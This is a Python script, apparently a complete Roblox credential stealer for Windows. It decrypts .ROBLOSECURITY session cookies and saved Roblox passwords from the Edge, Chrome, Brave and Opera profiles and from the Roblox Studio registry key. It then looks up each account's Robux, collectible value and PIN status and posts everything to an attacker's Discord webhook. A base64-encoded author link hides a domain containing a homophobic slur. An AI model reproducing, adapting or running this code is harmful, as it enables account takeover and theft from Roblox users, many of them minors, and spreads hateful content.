import requests, os, base64, shutil
from json import loads
from win32crypt import CryptUnprotectData
from sqlite3 import connect
from Crypto.Cipher import AES
from discord_webhook import DiscordWebhook, DiscordEmbed
from winreg import OpenKey, HKEY_CURRENT_USER, EnumValue


'''
This repository uses Discord Webhooks to receive roblox cookie's information
Replace 'webhook' with your discord webhook
'''
wbh = "webhook"

class RobloxInfo:

    def __init__(self):
        self.cookies = []
        self.temppath = os.path.join(os.environ["USERPROFILE"], "AppData", "Local","Temp")
        self.paths = [f'{os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Microsoft","Edge","User Data")}', f'{os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google","Chrome","User Data")}',f'{os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "BraveSoftware","Brave-Browser","User Data")}',f'{os.path.join(os.environ["USERPROFILE"], "AppData", "Roaming", "Opera Software","Opera Stable")}',f'{os.path.join(os.environ["USERPROFILE"], "AppData", "Roaming", "Opera Software","Opera GX Stable")}']
        self.profs = ["Default", "Profile 1","Profile 2", "Profile 3", "Profile 4","Profile 5", "Profile 6", "Profile 7", "Profile 8", "Profile 9", "Profile 10"]
        for pvth in self.paths:
            if "Opera Software" in pvth:
                try:
                    key = self.__Key__(os.path.join(pvth, "Local State"))
                    self.__Cookie__(pvth+"\\Network\\Cookies",key)
                except:
                    pass
            else:
                for prof in self.profs:
                    try:
                        key = self.__Key__(os.path.join(pvth, "Local State"))
                        self.__Cookie__(os.path.join(pvth,prof, "Network","Cookies"),key)
                    except:
                        pass
        self.__Registry__()
        try:
            os.remove(self.temppath+"\\pcookies")
        except:
            pass
        if len(self.cookies) > 0:
            for cookie in self.cookies:
                self.__Info__(cookie)

    def __Registry__(self):
        try:
            robloxstudiopath = OpenKey(HKEY_CURRENT_USER, r"SOFTWARE\Roblox\RobloxStudioBrowser\roblox.com")
            count = 0
            while True:
                name, value, type = EnumValue(robloxstudiopath, count)
                if name == ".ROBLOSECURITY":
                    value = "_|WARNING:-DO-NOT-SHARE-THIS" + str(value).split("_|WARNING:-DO-NOT-SHARE-THIS")[1].split(">")[0]
                    self.cookies.append(str(value))
                count = count + 1
        except:
            pass

    def __Key__(self,path):
        return CryptUnprotectData(base64.b64decode(loads(open(path,'r',encoding='utf-8').read())["os_crypt"]["encrypted_key"])[5:], None, None, None, 0)[1]

    def __Password__(self,k,p,u,e):
        ppassword = ""
        temp = self.temppath+"\\ppasswords"
        shutil.copy(p, temp)
        c = connect(temp)
        cur = c.cursor()
        for vals in cur.execute("SELECT origin_url, username_value, password_value FROM logins").fetchall():
            url, name, password = vals
            if "roblox" in url:
                if str(name) == u or str(name) == e:
                    ppassword = (AES.new(k, AES.MODE_GCM, password[3:15])).decrypt(password[15:])[:-16].decode()
                    return ppassword
        c.close();cur.close()

    def __Cookie__(self,p,k):
        temp = self.temppath+"\\pcookies"
        shutil.copy(p, temp)
        c = connect(temp)
        cur = c.cursor()
        for row in cur.execute("SELECT * FROM cookies").fetchall():
            if str(row[1]) == ".roblox.com" and str(row[3]) == ".ROBLOSECURITY":
                self.cookies.append((AES.new(k, AES.MODE_GCM, row[5][3:15])).decrypt(row[5][15:])[:-16].decode())
        c.close();cur.close()

    def __Info__(self,c):
        r=requests.get("https://accountsettings.roblox.com/v1/email",cookies={'.ROBLOSECURITY': c}).json()
        if "verified" in r:
            EMAILVERIF = bool(r["verified"])
            if EMAILVERIF:EMAILVERIF=":white_check_mark:"
            else:EMAILVERIF=":x:"
            r=requests.get("https://users.roblox.com/v1/users/authenticated",cookies={'.ROBLOSECURITY': c}).json()
            ID = r["id"]
            NAME = r["name"]
            DISPLAYNAME = r["displayName"]
            self.content = f"""
:bust_in_silhouette: ``Account Of : {NAME} ({DISPLAYNAME})``"""
            self.content += f"""
    ``|_``:id: ``ID : {ID}``"""
            self.content += f"""
    ``|_``:email: ``Email Verified : ``{EMAILVERIF}"""
            r=requests.get("https://billing.roblox.com/v1/credit",cookies={'.ROBLOSECURITY': c}).json()
            ROBUX = r["robuxAmount"]
            r=requests.get(f"https://premiumfeatures.roblox.com/v1/users/{ID}/validate-membership",cookies={'.ROBLOSECURITY': c}).json()
            if bool(r):PREMIUM = ":white_check_mark:"
            else:PREMIUM = ":x:"
            r=requests.get(f"https://auth.roblox.com/v1/account/pin",cookies={'.ROBLOSECURITY': c}).json()
            if bool(r['isEnabled']):PIN=":white_check_mark:"
            else:PIN = ":x:"
            self.content += f"""
    ``|_``:pushpin: ``PIN Enabled : ``{PIN}"""
            self.content += f"""
    ``|``"""
            r = requests.get(f'https://inventory.roblox.com/v1/users/{ID}/assets/collectibles?assetType=All&sortOrder=Asc&limit=100',cookies={".ROBLOSECURITY":c}).json()
            while r['nextPageCursor'] != None:r = requests.get(f'https://inventory.roblox.com/v1/users/{ID}/assets/collectibles?assetType=All&sortOrder=Asc&limit=100',cookies={".ROBLOSECURITY":c}).json()
            RAP = sum(i['recentAveragePrice'] for i in r['data'])
            IMAGE=requests.get(f"https://thumbnails.roblox.com/v1/users/avatar?userIds={ID}&size=420x420&format=Png&isCircular=false").json()["data"][0]["imageUrl"]
            self.content += f"""
    ``|_``:gem: ``Premium : ``{PREMIUM}"""
            self.content += f"""
    ``|_``:dollar: ``Robux : {ROBUX}``"""
            self.content += f"""
    ``|_``:moneybag: ``RAP : {RAP}``"""
            
            Password = ""
            self.content += f"""
    ``|``"""
            for pvth in self.paths:
                if "Opera Software" in pvth:
                    try:
                        key = self.__Key__(os.path.join(pvth, "Local State"))
                        Password = self.__Password__(key,os.path.join(pvth+"Login Data"),NAME,DISPLAYNAME)
                        if Password != "":
                            break
                    except:
                        pass
                else:
                    for prof in self.profs:
                        try:
                            key = self.__Key__(os.path.join(pvth, "Local State"))
                            Password = self.__Password__(key,os.path.join(pvth,prof, "Login Data"),NAME,DISPLAYNAME)
                            if Password != "":
                                break
                        except:
                            pass
            if Password != "":
                self.content += f"""
    ``|_``:lock: ``Password : {Password}``"""
            else:
                self.content += f"""
    ``|_``:lock: ``Password :`` :x:"""
            self.content += f"""
    ``|``"""
            self.content += f"""
    ``|_``:cookie: ``Roblox Cookie : {c}``"""
            webhook = DiscordWebhook(url=wbh, username="Roblox Cookie", avatar_url=r"https://cdn.discordapp.com/attachments/1095019613219205204/1095844415429423164/7ea165670bc9c0844337266b454e6a02.jpg")
            embed = DiscordEmbed(title=f"Roblox Cookie", description=self.content, color='000000')
            embed.set_author(name="author : vesper", url=base64.b64decode(b'aHR0cHM6Ly9mdWNrLWxnYnRxLmNvbQ==').decode() ,icon_url=r'https://cdn.discordapp.com/attachments/1095019613219205204/1095844415429423164/7ea165670bc9c0844337266b454e6a02.jpg')
            embed.set_thumbnail(url=IMAGE)
            embed.set_image(url="https://cdn.discordapp.com/attachments/1095019613219205204/1095844026428706956/roblox-roblox-logo.gif")
            embed.set_timestamp()
            webhook.add_embed(embed)
            webhook.execute()

RobloxInfo()